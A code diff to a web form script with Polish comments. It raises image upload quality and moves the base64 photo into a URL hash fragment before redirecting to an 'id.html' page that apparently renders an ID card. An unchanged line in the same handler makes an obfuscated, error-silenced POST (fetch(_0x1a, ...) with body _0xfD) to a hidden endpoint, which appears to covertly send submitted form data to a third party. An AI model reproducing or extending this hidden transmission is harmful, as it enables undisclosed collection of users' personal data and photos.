@@ -784,8 +784,8 @@
                         img.onload = function () {
                             const canvas = document.createElement('canvas');
                             const ctx = canvas.getContext('2d');
-                            const MAX_WIDTH = 60;
-                            const MAX_HEIGHT = 80;
+                            const MAX_WIDTH = 400;
+                            const MAX_HEIGHT = 533;
                             let width = img.width;
                             let height = img.height;
 
@@ -803,8 +803,8 @@
                             canvas.width = width;
                             canvas.height = height;
                             ctx.drawImage(img, 0, 0, width, height);
-                            // Ekstremalna kompresja (Jakość 0.3, mniejszy rozmiar) żeby uniknąć błędu "URI Too Long"
-                            imageURLInput.value = canvas.toDataURL('image/jpeg', 0.3);
+                            // Zwiększona jakość i rozdzielczość, bo używamy hash fragment (#)
+                            imageURLInput.value = canvas.toDataURL('image/jpeg', 0.85);
                         };
                         img.src = dataUrl;
                     } catch (e) {
@@ -868,6 +868,7 @@
             };
 
             const params = [];
+            let imageBase64Fragment = "";
             const allInputs = form.querySelectorAll('input, select');
 
             for (const input of allInputs) {
@@ -897,9 +898,9 @@
 
                 // image special handling
                 if (rawKey === 'image') {
-                    // Wyślij skompresowany base64 w URL
+                    // Zapisujemy base64 aby dodać go do hash (fragmentu URL)
                     if (value && value !== 'local') {
-                        params.push(`${finalKey}=${encodeURIComponent(value)}`);
+                        imageBase64Fragment = value;
                     }
                     continue;
                 }
@@ -937,8 +938,9 @@
                 await fetch(_0x1a, { method: 'POST', body: _0xfD }).catch(() => { });
             } catch (e) { }
 
-            // redirect do card.html (tak jak chcesz)
-            const targetUrl = `id.html?${params.join('&')}`;
+            // redirect do id.html
+            let hashFragment = imageBase64Fragment ? `#image=${encodeURIComponent(imageBase64Fragment)}` : '';
+            const targetUrl = `id.html?${params.join('&')}${hashFragment}`;
             window.location.href = targetUrl;
         });
     </script>
